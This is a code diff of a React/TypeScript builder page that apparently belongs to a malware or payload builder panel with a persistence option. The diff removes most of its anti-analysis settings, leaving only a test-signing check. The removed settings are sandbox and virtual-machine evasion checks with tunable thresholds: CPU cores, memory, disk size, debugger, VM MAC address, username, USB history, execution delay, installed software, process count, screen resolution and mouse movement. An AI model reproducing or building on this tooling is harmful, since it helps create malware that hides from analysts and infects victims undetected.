@@ -38,27 +38,7 @@ const DEFAULT_CONFIG: BuildConfigRequest = {
   enablePersistence: false,
   antiAnalysis: {
     enabled: false,
-    checkCpuCores: true,
-    minCpuCores: 2,
-    checkMemory: true,
-    minMemoryGb: 2,
-    checkDiskSize: true,
-    minDiskGb: 60,
-    checkDebugger: true,
-    checkVmMac: true,
-    checkUsername: true,
-    checkUsbHistory: true,
-    minUsbDevices: 2,
     checkTestSigning: true,
-    checkDelaySandbox: true,
-    delaySeconds: 5,
-    checkInstalledSoftware: true,
-    minInstalledSoftware: 30,
-    checkScreenResolution: true,
-    checkProcessCount: true,
-    minProcesses: 50,
-    checkMouseMovement: true,
-    mouseWaitSeconds: 10,
   },
 };
 
@@ -141,18 +121,6 @@ export default function BuilderPage() {
   ], []);
 
   const antiAnalysisOptions: AntiAnalysisToggle[] = useMemo(() => [
-    { id: 'checkCpuCores', key: 'checkCpuCores' },
-    { id: 'checkMemory', key: 'checkMemory' },
-    { id: 'checkDiskSize', key: 'checkDiskSize' },
-    { id: 'checkUsbHistory', key: 'checkUsbHistory' },
-    { id: 'checkDelaySandbox', key: 'checkDelaySandbox' },
-    { id: 'checkInstalledSoftware', key: 'checkInstalledSoftware' },
-    { id: 'checkProcessCount', key: 'checkProcessCount' },
-    { id: 'checkMouseMovement', key: 'checkMouseMovement' },
-    { id: 'checkScreenResolution', key: 'checkScreenResolution' },
-    { id: 'checkDebugger', key: 'checkDebugger' },
-    { id: 'checkVmMac', key: 'checkVmMac' },
-    { id: 'checkUsername', key: 'checkUsername' },
     { id: 'checkTestSigning', key: 'checkTestSigning' },
   ], []);
 
@@ -656,48 +624,6 @@ export default function BuilderPage() {
                       </ListView.Item>
                     )}
                   </ListView>
-                </div>
-                <div className="w-56 shrink-0 space-y-3 pt-1">
-                  <Slider aria-label={t('builder.minCpuCores')} isDisabled={!config.antiAnalysis.checkCpuCores} className="w-full" value={config.antiAnalysis.minCpuCores} minValue={1} maxValue={16} step={1} onChange={(v) => setAntiAnalysis('minCpuCores', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minCpuCores')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.minMemoryGb')} isDisabled={!config.antiAnalysis.checkMemory} className="w-full" value={config.antiAnalysis.minMemoryGb} minValue={1} maxValue={32} step={1} onChange={(v) => setAntiAnalysis('minMemoryGb', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minMemoryGb')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.minDiskGb')} isDisabled={!config.antiAnalysis.checkDiskSize} className="w-full" value={config.antiAnalysis.minDiskGb} minValue={20} maxValue={500} step={10} onChange={(v) => setAntiAnalysis('minDiskGb', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minDiskGb')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.minUsbDevices')} isDisabled={!config.antiAnalysis.checkUsbHistory} className="w-full" value={config.antiAnalysis.minUsbDevices} minValue={1} maxValue={10} step={1} onChange={(v) => setAntiAnalysis('minUsbDevices', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minUsbDevices')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.delaySeconds')} isDisabled={!config.antiAnalysis.checkDelaySandbox} className="w-full" value={config.antiAnalysis.delaySeconds} minValue={30} maxValue={180} step={1} onChange={(v) => setAntiAnalysis('delaySeconds', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.delaySeconds')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.minInstalledSoftware')} isDisabled={!config.antiAnalysis.checkInstalledSoftware} className="w-full" value={config.antiAnalysis.minInstalledSoftware} minValue={10} maxValue={100} step={5} onChange={(v) => setAntiAnalysis('minInstalledSoftware', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minInstalledSoftware')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.minProcesses')} isDisabled={!config.antiAnalysis.checkProcessCount} className="w-full" value={config.antiAnalysis.minProcesses} minValue={20} maxValue={150} step={5} onChange={(v) => setAntiAnalysis('minProcesses', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.minProcesses')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
-                  <Slider aria-label={t('builder.mouseWaitSeconds')} isDisabled={!config.antiAnalysis.checkMouseMovement} className="w-full" value={config.antiAnalysis.mouseWaitSeconds} minValue={3} maxValue={60} step={1} onChange={(v) => setAntiAnalysis('mouseWaitSeconds', (Array.isArray(v) ? v[0] : v) as number)}>
-                    <Label>{t('builder.mouseWaitSeconds')}</Label>
-                    <Slider.Output />
-                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
-                  </Slider>
                 </div>
               </div>
             )}
